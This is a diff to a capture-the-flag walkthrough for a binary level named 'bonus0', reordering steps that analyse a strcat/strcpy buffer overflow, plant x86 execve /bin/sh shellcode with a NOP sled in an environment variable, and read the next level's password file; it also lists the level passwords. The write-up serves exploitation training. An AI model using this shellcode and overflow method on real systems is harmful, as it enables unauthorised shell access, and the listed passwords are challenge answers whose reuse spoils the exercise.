@@ -11,7 +11,11 @@
    - Buffer overflow: 20 + 20 + 1 (space) + 20 (strcat) = 61 bytes into main's 54-byte buffer
    - Overflow of 7 bytes allows return address overwrite
 
-3. Verify with dynamic analysis:
+3. Connect to the VM via SSH:
+   ssh bonus0@localhost -p 2222
+   Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+4. Verify with dynamic analysis:
    Run ltrace to observe the vulnerability:
    
    ltrace ./bonus0
@@ -24,7 +28,7 @@
    - strcpy() copies "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB..." - reads past local_34!
    - Program crashes with SIGSEGV
 
-3. Calculate offsets and prepare shellcode:
+5. Calculate offsets and prepare shellcode:
    The EIP overwrite occurs at bytes 9-12 of the second input.
    
    Payload structure:
@@ -34,11 +38,7 @@
    Since we need shellcode, use environment variable method with NOP sled.
    The shellcode address will be approximately 0xbffffd58 (may vary slightly).
 
-4. Connect to the VM via SSH:
-   ssh bonus0@localhost -p 2222
-   Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-
-5. Execute the exploit:
+6. Execute the exploit:
    Export the shellcode as an environment variable:
    export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
    
@@ -51,12 +51,12 @@
    Author: Touhid M.Shaikh
    Length: 24 bytes (Linux x86 execve /bin/sh)
 
-6. Read the password:
+7. Read the password:
    cat /home/user/bonus1/.pass
    
    Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
-7. Exit and login as bonus1:
+8. Exit and login as bonus1:
    exit
    ssh bonus1@localhost -p 2222
    Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
